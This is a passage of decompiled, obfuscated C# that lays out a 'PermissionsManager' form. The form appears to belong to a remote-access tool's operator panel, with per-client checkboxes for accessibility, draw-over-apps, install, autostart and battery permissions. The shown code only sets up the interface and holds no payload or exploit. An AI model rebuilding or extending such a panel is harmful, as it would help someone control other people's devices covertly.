            num1 = (int) num2 * -794353894 ^ 360417410;
            continue;
          case 41:
            ((PermissionsManager) this).Primslist.FillDisableColor = Color.Black;
            ((PermissionsManager) this).Primslist.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).Primslist.ForeColor = Color.White;
            ((PermissionsManager) this).Primslist.HoverColor = Color.Silver;
            num1 = (int) num2 * -1216331965 ^ -179331546;
            continue;
          case 42:
            ((PermissionsManager) this).Label5.AutoSize = true;
            num1 = (int) num2 * 1233268330 ^ -1157485099;
            continue;
          case 43:
            ((PermissionsManager) this).DrakeUIButtonIcon3.Location = new Point(0, 0);
            num1 = (int) num2 * -290439687 ^ -695058969;
            continue;
          case 44:
            ((PermissionsManager) this).checkacess = new DrakeUICheckBox();
            num1 = (int) num2 * -1003536935 ^ 1770269237;
            continue;
          case 45:
            ((PermissionsManager) this).checkacess.Cursor = Cursors.Hand;
            num1 = (int) num2 * 819844357 ^ 480851344;
            continue;
          case 46:
            ((PermissionsManager) this).checkbattery = new DrakeUICheckBox();
            ((PermissionsManager) this).checkdraw = new DrakeUICheckBox();
            num1 = (int) num2 * -2116980711 ^ 486327394;
            continue;
          case 47:
            ((PermissionsManager) this).checkacess.Size = new Size(32, 22);
            ((PermissionsManager) this).checkacess.TabIndex = 13;
            num1 = (int) num2 * -1256604958 ^ -804803810;
            continue;
          case 48:
            gridViewCellStyle3 = new DataGridViewCellStyle();
            num1 = (int) num2 * -1947157426 ^ -234742885;
            continue;
          case 49:
            ((PermissionsManager) this).Label5.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * -1786605492 ^ 1731276337;
            continue;
          case 50:
            ((PermissionsManager) this).clinameinfo.TabIndex = 12;
            ((PermissionsManager) this).clinameinfo.Text = EXGuarder.\u0034E0D0029;
            ((PermissionsManager) this).clinameinfo.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1518496670 ^ 1685233931;
            continue;
          case 51:
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).Label3);
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).Label2);
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).Label1);
            ((PermissionsManager) this).Panel1.Dock = DockStyle.Top;
            ((PermissionsManager) this).Panel1.Location = new Point(0, 0);
            num1 = (int) num2 * -1316421116 ^ 96245634;
            continue;
          case 52:
            ((PermissionsManager) this).clinameinfo.Name = EXGuarder.\u0035C09453E;
            ((PermissionsManager) this).clinameinfo.Size = new Size(668, 29);
            num1 = (int) num2 * -1775202077 ^ 1443738986;
            continue;
          case 53:
            ((PermissionsManager) this).Label5.Text = EXGuarder.\u0033A621660;
            ((PermissionsManager) this).PictureBox1.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u0032E5C0B2C);
            num1 = (int) num2 * -309969410 ^ -1468762033;
            continue;
          case 54:
            ((PermissionsManager) this).Panel2 = new Panel();
            num1 = (int) num2 * -1667554305 ^ -2022579583;
            continue;
          case 55:
            ((PermissionsManager) this).statustext.BackColor = Color.Black;
            num1 = (int) num2 * -1112577292 ^ 105808370;
            continue;
          case 56:
            gridViewCellStyle4.SelectionForeColor = Color.Black;
            num1 = (int) num2 * 881373899 ^ 87062846;
            continue;
          case 57:
            ((PermissionsManager) this).checkinstall.Size = new Size(32, 22);
            ((PermissionsManager) this).checkinstall.TabIndex = 17;
            ((PermissionsManager) this).Label6.AutoSize = true;
            num1 = (int) num2 * 528525035 ^ -692758164;
            continue;
          case 58:
            ((PermissionsManager) this).DrakeUITabControl1.Dock = DockStyle.Fill;
            num1 = (int) num2 * -1626354272 ^ 1099179042;
            continue;
          case 59:
            ((PermissionsManager) this).DrakeUIButtonIcon3.Symbol = 61473;
            ((PermissionsManager) this).DrakeUIButtonIcon3.TabIndex = 34;
            num1 = (int) num2 * 46007026 ^ 30321386;
            continue;
          case 60:
            ((PermissionsManager) this).Status.HeaderText = EXGuarder.\u003753A1C37;
            ((PermissionsManager) this).Status.Name = EXGuarder.\u00323163A1C;
            num1 = (int) num2 * -2078988955 ^ 1118272878;
            continue;
          case 61:
            ((PermissionsManager) this).Panel2.ResumeLayout(false);
            num1 = (int) num2 * -588285615 ^ 1463095557;
            continue;
          case 62:
            ((PermissionsManager) this).DrakeUITabControl1.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -1500668011 ^ -1056170526;
            continue;
          case 63:
            ((PermissionsManager) this).Button1.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -1746839559 ^ 288283004;
            continue;
          case 64:
            this.ClientSize = new Size(700, 428);
            num1 = (int) num2 * -256088742 ^ 1872634304;
            continue;
          case 65:
            ((PermissionsManager) this).Button2.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * 447360502 ^ 1030650404;
            continue;
          case 66:
            ((PermissionsManager) this).Label3.AutoSize = true;
            num1 = (int) num2 * -1909247990 ^ 1296253224;
            continue;
          case 67:
            ((PermissionsManager) this).Checkbg.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).Checkbg.Location = new Point(456, 49);
            num1 = (int) num2 * -316261539 ^ 1245800109;
            continue;
          case 68:
            ((PermissionsManager) this).checkinstall.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).checkinstall.Location = new Point(22, 58);
            num1 = (int) num2 * 821432222 ^ 1987349364;
            continue;
          case 69:
            ((PermissionsManager) this).TabPage3.Controls.Add((Control) ((PermissionsManager) this).Label4);
            ((PermissionsManager) this).TabPage3.Controls.Add((Control) ((PermissionsManager) this).TextBox1);
            num1 = (int) num2 * 1551492324 ^ 1154779049;
            continue;
          case 70:
            this.Name = EXGuarder.\u0034B3B185D;
            num1 = (int) num2 * 1836883317 ^ -749909452;
            continue;
          case 71:
            ((PermissionsManager) this).Panel2.Name = EXGuarder.\u0035C2E7811;
            num1 = (int) num2 * 195731273 ^ -284030500;
            continue;
          case 72:
            this.Controls.Add((Control) ((PermissionsManager) this).Panel2);
            this.Controls.Add((Control) ((PermissionsManager) this).DrakeUITabControl1);
            num1 = (int) num2 * -19577395 ^ 846082273;
            continue;
          case 73:
            ((PermissionsManager) this).iconprim.FillWeight = 20f;
            num1 = (int) num2 * -1236602830 ^ -740759320;
            continue;
          case 74:
            ((PermissionsManager) this).DGVPRIM.RowsDefaultCellStyle = gridViewCellStyle4;
            ((PermissionsManager) this).DGVPRIM.RowTemplate.Height = 24;
            num1 = (int) num2 * -1338664061 ^ -1609552211;
            continue;
          case 75:
            ((PermissionsManager) this).Button1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).Button1.Location = new Point(532, 299);
            ((PermissionsManager) this).Button1.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -761183528 ^ 2084355150;
            continue;
          case 76:
            this.TopMost = true;
            ((PermissionsManager) this).DrakeUITabControl1.ResumeLayout(false);
            num1 = (int) num2 * -1651349718 ^ -881147768;
            continue;
          case 77:
            ((PermissionsManager) this).Panel2.Size = new Size(700, 22);
            ((PermissionsManager) this).Panel2.TabIndex = 31;
            num1 = (int) num2 * 2114544734 ^ 1076718005;
            continue;
          case 78:
            ((PermissionsManager) this).TabPage3.PerformLayout();
            num1 = (int) num2 * -200858538 ^ -707321909;
            continue;
          case 79:
            ((PermissionsManager) this).Primslist.Margin = new Padding(3, 4, 3, 4);
            ((PermissionsManager) this).Primslist.Name = EXGuarder.\u00337493E4F;
            num1 = (int) num2 * 2099919322 ^ -424471601;
            continue;
          case 80:
            gridViewCellStyle4.SelectionBackColor = Color.White;
            num1 = (int) num2 * -1778857847 ^ -774984730;
            continue;
          case 81:
            ((PermissionsManager) this).Label5 = new Label();
            num1 = (int) num2 * -800336059 ^ 348743075;
            continue;
          case 82:
            gridViewCellStyle3.BackColor = Color.Black;
            gridViewCellStyle3.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * -1562431029 ^ -637409108;
            continue;
          case 83:
            ((PermissionsManager) this).Status = new DataGridViewTextBoxColumn();
            ((PermissionsManager) this).DrakeUIButtonIcon3 = new DrakeUIButtonIcon();
            ((PermissionsManager) this).TabPage2 = new TabPage();
            ((PermissionsManager) this).Button1 = new Button();
            num1 = (int) num2 * -1539214797 ^ 952678909;
            continue;
          case 84:
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            this.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 47890745 ^ -845312980;
            continue;
          case 85:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.True;
            num1 = (int) num2 * 1924057295 ^ 1897723341;
            continue;
          case 86:
            ((PermissionsManager) this).TabPage3.Controls.Add((Control) ((PermissionsManager) this).PictureBox2);
            ((PermissionsManager) this).TabPage3.Controls.Add((Control) ((PermissionsManager) this).Label5);
            num1 = (int) num2 * 2077536001 ^ 1891041252;
            continue;
          case 87:
            ((PermissionsManager) this).DGVPRIM.DefaultCellStyle = gridViewCellStyle5;
            num1 = (int) num2 * -2111034790 ^ 300579713;
            continue;
          case 88:
            ((PermissionsManager) this).Button1.Name = EXGuarder.\u0033947526A;
            num1 = (int) num2 * -971703245 ^ 958091033;
            continue;
          case 89:
            ((PermissionsManager) this).checkacess.Name = EXGuarder.\u00374123430;
            num1 = (int) num2 * 1207409008 ^ 59504995;
            continue;
          case 90:
            ((PermissionsManager) this).DrakeUITabControl1.Style = UIStyle.Custom;
            num1 = (int) num2 * 1722911041 ^ -616333662;
            continue;
          case 91:
            ((PermissionsManager) this).comboproms.Name = EXGuarder.\u003332F113F;
            ((PermissionsManager) this).comboproms.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * 1448393072 ^ -1186808594;
            continue;
          case 92:
            ((PermissionsManager) this).TabPage1.ResumeLayout(false);
            num1 = (int) num2 * -1914528869 ^ 1403911981;
            continue;
          case 93:
            ((PermissionsManager) this).Panel2.BackColor = Color.Black;
            num1 = (int) num2 * 1801739016 ^ -2007120692;
            continue;
          case 94:
            ((PermissionsManager) this).Label6.ForeColor = Color.White;
            num1 = (int) num2 * -115922170 ^ -80533888;
            continue;
          case 95:
            ((PermissionsManager) this).DGVPRIM.RowHeadersVisible = false;
            num1 = (int) num2 * -606359299 ^ 2100835129;
            continue;
          case 96:
            ((PermissionsManager) this).checkautostart.Padding = new Padding(22, 0, 0, 0);
            ((PermissionsManager) this).checkautostart.Size = new Size(32, 22);
            ((PermissionsManager) this).checkautostart.TabIndex = 16;
            num1 = (int) num2 * -2071083435 ^ -261564735;
            continue;
          case 97:
            ((PermissionsManager) this).PictureBox1.Location = new Point(396, 80);
            ((PermissionsManager) this).PictureBox1.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -2096584475 ^ -1055530264;
            continue;
          case 98:
            ((PermissionsManager) this).statustext.TextAlign = ContentAlignment.MiddleLeft;
            ((PermissionsManager) this).DrakeUIToolTip1.BackColor = Color.FromArgb(54, 54, 54);
            ((PermissionsManager) this).DrakeUIToolTip1.ForeColor = Color.FromArgb(239, 239, 239);
            ((PermissionsManager) this).DrakeUIToolTip1.OwnerDraw = true;
            ((PermissionsManager) this).Panel3.BackColor = Color.Black;
            num1 = (int) num2 * -870663655 ^ 1299257950;
            continue;
          case 99:
            ((PermissionsManager) this).Primslist = new DrakeUIListBox();
            ((PermissionsManager) this).addactiv = new Button();
            num1 = (int) num2 * -859128965 ^ 391958068;
            continue;
          case 100:
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).checkbattery);
            num1 = (int) num2 * -764483074 ^ -2068331772;
            continue;
          case 101:
            gridViewCellStyle2.SelectionBackColor = Color.White;
            num1 = (int) num2 * -412911940 ^ -1620473384;
            continue;
          case 102:
            ((PermissionsManager) this).Panel3.ResumeLayout(false);
            ((ISupportInitialize) ((PermissionsManager) this).ClientPic).EndInit();
            num1 = (int) num2 * 264894017 ^ -575770628;
            continue;
          case 103:
            ((PermissionsManager) this).DrakeUITabControl1.TabSelectedForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).DrakeUITabControl1.TabSelectedHighColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 61395886 ^ 1003287376;
            continue;
          case 104:
            ((PermissionsManager) this).DrakeUITabControl1.SizeMode = TabSizeMode.Fixed;
            num1 = (int) num2 * 879711847 ^ -806863718;
            continue;
          case 105:
            ((PermissionsManager) this).clinameinfo.Dock = DockStyle.Fill;
            ((PermissionsManager) this).clinameinfo.Font = new Font(EXGuarder.\u00332186A2B, 9f);
            ((PermissionsManager) this).clinameinfo.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1760068838 ^ -1130101005;
            continue;
          case 106:
            ((PermissionsManager) this).DrakeUITabControl1.TabBackColor = Color.Black;
            ((PermissionsManager) this).DrakeUITabControl1.TabIndex = 0;
            num1 = (int) num2 * 1324458697 ^ -108385047;
            continue;
          case 107:
            ((PermissionsManager) this).DGVPRIM.ShowCellErrors = false;
            num1 = (int) num2 * 1807723215 ^ 1338290403;
            continue;
          case 108:
            ((PermissionsManager) this).Label4 = new Label();
            num1 = (int) num2 * -716067646 ^ -1419587531;
            continue;
          case 109:
            ((PermissionsManager) this).Label2 = new Label();
            ((PermissionsManager) this).Label1 = new Label();
            ((PermissionsManager) this).TabPage3 = new TabPage();
            num1 = (int) num2 * 264152465 ^ -82021546;
            continue;
          case 110:
            ((PermissionsManager) this).comboproms.RectColor = Color.FromArgb(56, 142, 60);
            ((PermissionsManager) this).comboproms.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 1901807319 ^ -593989082;
            continue;
          case 111:
            componentResourceManager = new ComponentResourceManager(typeof (PermissionsManager));
            ((PermissionsManager) this).DrakeUITabControl1 = new DrakeUITabControl();
            ((PermissionsManager) this).TabPage1 = new TabPage();
            ((PermissionsManager) this).DGVPRIM = new DataGridView();
            num1 = (int) num2 * -1345233161 ^ 1603452690;
            continue;
          case 112:
            gridViewCellStyle5.BackColor = Color.Black;
            gridViewCellStyle5.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * 649642528 ^ -276188143;
            continue;
          case 113:
            ((PermissionsManager) this).Button1.Size = new Size(128, 32);
            num1 = (int) num2 * -1938439066 ^ -1245465298;
            continue;
          case 114:
            ((PermissionsManager) this).Panel3.Size = new Size(700, 29);
            ((PermissionsManager) this).Panel3.TabIndex = 32;
            ((PermissionsManager) this).clinameinfo.BackColor = Color.Transparent;
            num1 = (int) num2 * -908172236 ^ -1293683391;
            continue;
          case 115:
            ((PermissionsManager) this).DGVPRIM.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num2 * -2087024293 ^ -1368034350;
            continue;
          case 116:
            ((PermissionsManager) this).TabPage2.BackColor = Color.Black;
            num1 = (int) num2 * 1716522907 ^ -1357108755;
            continue;
          case 117:
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).Label6);
            num1 = (int) num2 * 407569722 ^ -1029093128;
            continue;
          case 118:
            ((PermissionsManager) this).Checkbg.TabIndex = 17;
            ((PermissionsManager) this).checkautostart.CheckBoxColor = Color.FromArgb(30, 136, 229);
            ((PermissionsManager) this).checkautostart.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1230565289 ^ 1068659699;
            continue;
          case 119:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 6091372 ^ 424054724;
            continue;
          case 120:
            ((PermissionsManager) this).DrakeUITabControl1.ItemSize = new Size(250, 40);
            ((PermissionsManager) this).DrakeUITabControl1.Location = new Point(0, 29);
            num1 = (int) num2 * -1918282179 ^ 1013953316;
            continue;
          case 121:
            ((PermissionsManager) this).Primslist.Padding = new Padding(5, 5, 5, 5);
            ((PermissionsManager) this).Primslist.Radius = 15;
            num1 = (int) num2 * -1830546229 ^ -1972868551;
            continue;
          case 122:
            ((PermissionsManager) this).PictureBox2.Name = EXGuarder.\u00317177834;
            num1 = (int) num2 * -817719784 ^ 2012145336;
            continue;
          case 123:
            ((PermissionsManager) this).DrakeUIToolTip1 = new DrakeUIToolTip(((ScreenReaderV2) this).components);
            ((PermissionsManager) this).Panel3 = new Panel();
            num1 = (int) num2 * -1904213445 ^ 1356646062;
            continue;
          case 124:
            ((PermissionsManager) this).TabPage3.BackColor = Color.Black;
            ((PermissionsManager) this).TabPage3.Controls.Add((Control) ((PermissionsManager) this).Checkbg);
            ((PermissionsManager) this).TabPage3.Controls.Add((Control) ((PermissionsManager) this).checkautostart);
            num1 = (int) num2 * 1867775517 ^ -729061830;
            continue;
          case 125:
            ((PermissionsManager) this).Label6.Size = new Size(85, 19);
            ((PermissionsManager) this).Label6.TabIndex = 16;
            num1 = (int) num2 * 1080132215 ^ -1941911599;
            continue;
          case 126:
            goto label_1;
          case (uint) sbyte.MaxValue:
            ((PermissionsManager) this).TabPage3.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 1979025432 ^ -1301779316;
            continue;
          case 128:
            ((PermissionsManager) this).comboproms.Location = new Point(35, 111);
            ((PermissionsManager) this).comboproms.Margin = new Padding(3, 4, 3, 4);
            ((PermissionsManager) this).comboproms.MinimumSize = new Size(47, 0);
            num1 = (int) num2 * -1602786666 ^ 1631933655;
            continue;
          case 129:
            ((PermissionsManager) this).checkinstall.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -883091039 ^ -1753048938;
            continue;
          case 130:
            ((PermissionsManager) this).ClientPic.Margin = new Padding(2, 3, 2, 3);
            ((PermissionsManager) this).ClientPic.Name = EXGuarder.\u0032264116D;
            num1 = (int) num2 * 1047027550 ^ -450616245;
            continue;
          case 131:
            ((PermissionsManager) this).Label2.Text = EXGuarder.\u0030976713A;
            ((PermissionsManager) this).Label1.AutoSize = true;
            num1 = (int) num2 * -146732236 ^ -1315631215;
            continue;
          case 132:
            ((PermissionsManager) this).Label2.Size = new Size(131, 19);
            num1 = (int) num2 * 644907992 ^ -289891412;
            continue;
          case 133:
            ((PermissionsManager) this).TabPage1.Size = new Size(700, 359);
            num1 = (int) num2 * -1114384080 ^ -1718144108;
            continue;
          case 134:
            ((PermissionsManager) this).TabPage2.Text = EXGuarder.\u0032F163F74;
            num1 = (int) num2 * 1835976828 ^ 428208859;
            continue;
          case 135:
            ((PermissionsManager) this).iconprim = new DataGridViewImageColumn();
            ((PermissionsManager) this).primname = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -221303593 ^ -1307999150;
            continue;
          case 136:
            ((PermissionsManager) this).DrakeUIButtonIcon3.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).DrakeUIButtonIcon3.Name = EXGuarder.\u0031A5D3078;
            num1 = (int) num2 * -1346299339 ^ -276176425;
            continue;
          case 137:
            ((PermissionsManager) this).Label3.TabIndex = 12;
            num1 = (int) num2 * 1559120377 ^ -307587038;
            continue;
          case 138:
            ((PermissionsManager) this).addactiv.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -639514769 ^ -798731141;
            continue;
          case 139:
            ((PermissionsManager) this).Label3 = new Label();
            num1 = (int) num2 * -544871589 ^ -1886839464;
            continue;
          case 140:
            ((PermissionsManager) this).DrakeUITabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
            num1 = (int) num2 * 1443749455 ^ 464979465;
            continue;
          case 141:
            ((PermissionsManager) this).Status.FillWeight = 45f;
            num1 = (int) num2 * 1998549154 ^ 2090184334;
            continue;
          case 142:
            ((PermissionsManager) this).DGVPRIM.AlternatingRowsDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * -1226587765 ^ -1736826330;
            continue;
          case 143:
            ((PermissionsManager) this).Label3.ForeColor = Color.White;
            num1 = (int) num2 * -1188069801 ^ 2124958757;
            continue;
          case 144:
            ((PermissionsManager) this).Panel2.Location = new Point(0, 406);
            ((PermissionsManager) this).Panel2.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -1503646367 ^ -1578525967;
            continue;
          case 145:
            ((PermissionsManager) this).comboproms.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * 2139309726 ^ 551848388;
            continue;
          case 146:
            ((PermissionsManager) this).iconprim.HeaderText = EXGuarder.\u003494C4D2A;
            ((PermissionsManager) this).iconprim.Name = EXGuarder.\u00359433B33;
            ((PermissionsManager) this).primname.FillWeight = 73.85786f;
            ((PermissionsManager) this).primname.HeaderText = EXGuarder.\u003150C5349;
            num1 = (int) num2 * 355785601 ^ 2089629008;
            continue;
          case 147:
            ((PermissionsManager) this).PictureBox2.TabIndex = 15;
            num1 = (int) num2 * -418635428 ^ -378623110;
            continue;
          case 148:
            ((PermissionsManager) this).Label6.Text = EXGuarder.\u00378247700;
            ((PermissionsManager) this).checkbattery.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * -1967532252 ^ 1615211833;
            continue;
          case 149:
            gridViewCellStyle4 = new DataGridViewCellStyle();
            num1 = (int) num2 * 1394964076 ^ 32390047;
            continue;
          case 150:
            ((PermissionsManager) this).checkbattery.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -1496969116 ^ 954097909;
            continue;
          case 151:
            ((PermissionsManager) this).Button2.UseVisualStyleBackColor = true;
            num1 = (int) num2 * 1730932015 ^ -2048670761;
            continue;
          case 152:
            ((PermissionsManager) this).TabPage2.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).TabPage2.Name = EXGuarder.\u003485B660E;
            num1 = (int) num2 * -514290823 ^ -1127856917;
            continue;
          case 153:
            gridViewCellStyle1.SelectionForeColor = Color.Black;
            num1 = (int) num2 * 1662302324 ^ -755468330;
            continue;
          case 154:
            ((PermissionsManager) this).TextBox1.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 491874901 ^ 857320279;
            continue;
          case 155:
            ((PermissionsManager) this).DGVPRIM.Dock = DockStyle.Fill;
            num1 = (int) num2 * -629243024 ^ 1616373044;
            continue;
          case 156:
            ((PermissionsManager) this).DGVPRIM.AllowUserToAddRows = false;
            ((PermissionsManager) this).DGVPRIM.AllowUserToDeleteRows = false;
            num1 = (int) num2 * -430649514 ^ 878931835;
            continue;
          case 157:
            ((PermissionsManager) this).comboproms = new DrakeUIComboBox();
            num1 = (int) num2 * 680156692 ^ -519377907;
            continue;
          case 158:
            ((PermissionsManager) this).TabPage3.Size = new Size(700, 359);
            ((PermissionsManager) this).TabPage3.TabIndex = 2;
            num1 = (int) num2 * 675586555 ^ -1805846163;
            continue;
          case 159:
            ((PermissionsManager) this).DrakeUITabControl1.Size = new Size(700, 399);
            num1 = (int) num2 * -685188943 ^ -886420657;
            continue;
          case 160:
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).checkinstall);
            num1 = (int) num2 * -608851962 ^ -286057743;
            continue;
          case 161:
            ((PermissionsManager) this).PictureBox2.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u00379447056);
            num1 = (int) num2 * 1719403415 ^ 1171398239;
            continue;
          case 162:
            ((PermissionsManager) this).Label6.Location = new Point(58, 60);
            ((PermissionsManager) this).Label6.Margin = new Padding(2, 0, 2, 0);
            ((PermissionsManager) this).Label6.Name = EXGuarder.\u00336054D45;
            num1 = (int) num2 * 964503031 ^ 2081516675;
            continue;
          case 163:
            ((PermissionsManager) this).ClientPic.SizeMode = PictureBoxSizeMode.Zoom;
            ((PermissionsManager) this).ClientPic.TabIndex = 11;
            num1 = (int) num2 * 2062656595 ^ -622969903;
            continue;
          case 164:
            ((PermissionsManager) this).Button2.Size = new Size(49, 26);
            ((PermissionsManager) this).Button2.TabIndex = 31;
            ((PermissionsManager) this).Button2.Text = EXGuarder.\u003460D3257;
            num1 = (int) num2 * 2061715734 ^ -829364966;
            continue;
          case 165:
            ((PermissionsManager) this).checkinstall.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * -1825098583 ^ 2000361264;
            continue;
          case 166:
            ((PermissionsManager) this).DGVPRIM.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            num1 = (int) num2 * 75962659 ^ 689599886;
            continue;
          case 167:
            ((PermissionsManager) this).DrakeUITabControl1.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * 552022108 ^ -2024284174;
            continue;
          case 168:
            ((PermissionsManager) this).ClientPic.TabStop = false;
            num1 = (int) num2 * 1625935510 ^ 1594400625;
            continue;
          case 169:
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).checkacess);
            num1 = (int) num2 * 328053981 ^ 977996758;
            continue;
          case 170:
            ((PermissionsManager) this).Checkbg.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).Checkbg.Name = EXGuarder.\u0030F606329;
            ((PermissionsManager) this).Checkbg.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -2006588838 ^ 1318046849;
            continue;
          case 171:
            ((PermissionsManager) this).addactiv.UseVisualStyleBackColor = true;
            num1 = (int) num2 * -1306331130 ^ -1412228022;
            continue;
          case 172:
            ((PermissionsManager) this).TabPage1.Text = EXGuarder.\u0031533205C;
            num1 = (int) num2 * 175393822 ^ -1163245708;
            continue;
          case 173:
            ((PermissionsManager) this).Primslist.Style = UIStyle.Custom;
            num1 = (int) num2 * -72054032 ^ 1861647846;
            continue;
          case 174:
            ((PermissionsManager) this).comboproms.Size = new Size(500, 30);
            num1 = (int) num2 * -1633721981 ^ -43302666;
            continue;
          case 175:
            ((PermissionsManager) this).Panel1 = new Panel();
            ((PermissionsManager) this).checkinstall = new DrakeUICheckBox();
            num1 = (int) num2 * -24222550 ^ -1933775584;
            continue;
          case 176:
            ((PermissionsManager) this).TextBox1.TextAlign = HorizontalAlignment.Center;
            num1 = (int) num2 * -1185301003 ^ -1078471925;
            continue;
          case 177:
            goto label_3;
          case 178:
            ((PermissionsManager) this).Button1.TabIndex = 30;
            num1 = (int) num2 * -968303331 ^ -1655841228;
            continue;
          case 179:
            ((PermissionsManager) this).Primslist.FillColor = Color.Black;
            num1 = (int) num2 * 770795805 ^ -2049764562;
            continue;
          case 180:
            ((PermissionsManager) this).Label2.Name = EXGuarder.\u003144F1A14;
            num1 = (int) num2 * -746587544 ^ 1169787556;
            continue;
          case 181:
            ((PermissionsManager) this).Label1.Size = new Size(147, 19);
            num1 = (int) num2 * -223490145 ^ -1641947260;
            continue;
          case 182:
            ((PermissionsManager) this).Label5.Size = new Size(73, 19);
            ((PermissionsManager) this).Label5.TabIndex = 14;
            num1 = (int) num2 * 426627101 ^ -1541821713;
            continue;
          case 183:
            ((PermissionsManager) this).DGVPRIM.Location = new Point(0, 50);
            ((PermissionsManager) this).DGVPRIM.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * -1254350794 ^ -1420524087;
            continue;
          case 184:
            this.BackColor = Color.Black;
            num1 = (int) num2 * 740894281 ^ 1857994378;
            continue;
          case 185:
            ((PermissionsManager) this).Checkbg.Size = new Size(32, 22);
            num1 = (int) num2 * 27361749 ^ -1853553783;
            continue;
          case 186:
            ((PermissionsManager) this).PictureBox2.Location = new Point(44, 80);
            ((PermissionsManager) this).PictureBox2.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 381434705 ^ -1389179792;
            continue;
          case 187:
            ((PermissionsManager) this).comboproms.TabIndex = 27;
            num1 = (int) num2 * -106650512 ^ 1699267229;
            continue;
          case 188:
            gridViewCellStyle1.SelectionBackColor = Color.White;
            num1 = (int) num2 * 1070551696 ^ -1487375171;
            continue;
          case 189:
            ((PermissionsManager) this).ClientPic.Size = new Size(32, 29);
            num1 = (int) num2 * 714220838 ^ -407964921;
            continue;
          case 190:
            ((PermissionsManager) this).Primslist.StyleCustomMode = true;
            ((PermissionsManager) this).Primslist.TabIndex = 29;
            ((PermissionsManager) this).Primslist.Text = EXGuarder.\u0031B140A54;
            num1 = (int) num2 * -484307096 ^ 1744327280;
            continue;
          case 191:
            ((PermissionsManager) this).Label3.Name = EXGuarder.\u003265C1404;
            num1 = (int) num2 * 1221909331 ^ 701893645;
            continue;
          case 192:
            ((PermissionsManager) this).TextBox1.ReadOnly = true;
            num1 = (int) num2 * -1367426975 ^ -1768008556;
            continue;
          case 193:
            ((PermissionsManager) this).Label2.AutoSize = true;
            num1 = (int) num2 * -878913915 ^ 344475713;
            continue;
          case 194:
            ((PermissionsManager) this).Label3.Location = new Point(568, 26);
            num1 = (int) num2 * 2034468766 ^ -58543510;
            continue;
          case 195:
            ((PermissionsManager) this).checkacess.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 1507907218 ^ -1070701623;
            continue;
          case 196:
            ((PermissionsManager) this).Label3.Margin = new Padding(2, 0, 2, 0);
            num1 = (int) num2 * 2096553402 ^ -1524388423;
            continue;
          case 197:
            ((ISupportInitialize) ((PermissionsManager) this).ClientPic).BeginInit();
            this.SuspendLayout();
            ((PermissionsManager) this).DrakeUITabControl1.Controls.Add((Control) ((PermissionsManager) this).TabPage1);
            num1 = (int) num2 * -1200017462 ^ 48073838;
            continue;
          case 198:
            ((PermissionsManager) this).addactiv.Location = new Point(549, 111);
            num1 = (int) num2 * 960190639 ^ 480205424;
            continue;
          case 199:
            this.Controls.Add((Control) ((PermissionsManager) this).Panel3);
            num1 = (int) num2 * 1835024588 ^ -2103005714;
            continue;
          case 200:
            ((PermissionsManager) this).Primslist.BackColor = Color.Black;
            num1 = (int) num2 * -1835437727 ^ -788053667;
            continue;
          case 201:
